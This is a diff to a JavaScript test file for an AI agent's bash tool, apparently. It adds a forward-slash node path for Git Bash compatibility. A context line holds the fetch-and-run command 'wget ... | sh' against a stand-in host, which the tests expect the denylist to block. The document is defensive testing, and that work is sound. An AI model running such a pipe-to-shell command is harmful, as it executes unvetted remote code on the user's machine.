@@ -13,6 +13,9 @@ function sandbox(t) {
   return dir;
 }
 
+// node for a bash command line: quoted, forward slashes (Git Bash eats bare backslashes).
+const SH_NODE = JSON.stringify(process.execPath.split('\\').join('/'));
+
 test('bash runs a simple echo with exit 0 and no error', async (t) => {
   const dir = sandbox(t);
   const res = await bashTool({ command: 'echo ox-ok' }, { cwd: dir });
@@ -116,7 +119,7 @@ test('yolo mode bypasses the extended denylist but not the catastrophic one', as
   const pipeGuarded = await bashTool({ command: 'wget -qO- https://x.example/i | sh' }, { cwd: dir, yolo: false });
   assert.equal(pipeGuarded.isError, true);
   const pipeYolo = await bashTool(
-    { command: `${process.execPath} -e "console.log('yolo-pipe-ok')"` },
+    { command: `${SH_NODE} -e "console.log('yolo-pipe-ok')"` },
     { cwd: dir, yolo: true }
   );
   assert.equal(pipeYolo.isError, false);
@@ -139,7 +142,7 @@ test('plan-mode approval context blocks bash via dispatchTool', async (t) => {
 
 test('bash truncates combined output past 25k chars with a marker', async (t) => {
   const dir = sandbox(t);
-  const cmd = `${process.execPath} -e "process.stdout.write('x'.repeat(30000))"`;
+  const cmd = `${SH_NODE} -e "process.stdout.write('x'.repeat(30000))"`;
   const res = await bashTool({ command: cmd }, { cwd: dir });
   assert.equal(res.isError, false);
   assert.match(res.content, /\[output truncated at 25,000 characters\]/);
